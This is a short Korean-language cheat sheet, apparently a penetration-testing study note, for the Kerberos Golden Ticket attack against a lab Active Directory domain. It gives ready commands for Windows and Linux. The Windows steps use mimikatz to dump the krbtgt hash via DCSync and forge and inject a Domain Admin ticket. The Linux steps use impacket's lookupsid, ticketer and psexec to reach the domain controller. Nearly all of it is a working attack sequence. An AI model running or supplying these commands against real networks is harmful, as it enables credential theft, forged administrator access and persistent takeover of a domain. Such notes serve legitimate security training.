## Golden Ticket
- krbtgt의 NTLM 해시를 사용하여 임의의 사용자에 대해 Domain Admins 권한이 담긴 PAC를 위조하고, 이를 기반으로 TGT를 직접 생성하는 공격.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainSID
```
```
.\mimikatz.exe

mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local

mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```
```powershell
Enter-PSSession dc01
```

### Linux
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids

ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator

export KRB5CCNAME=./Administrator.ccache

psexec.py -k -no-pass dc01.inlanefreight.local
```
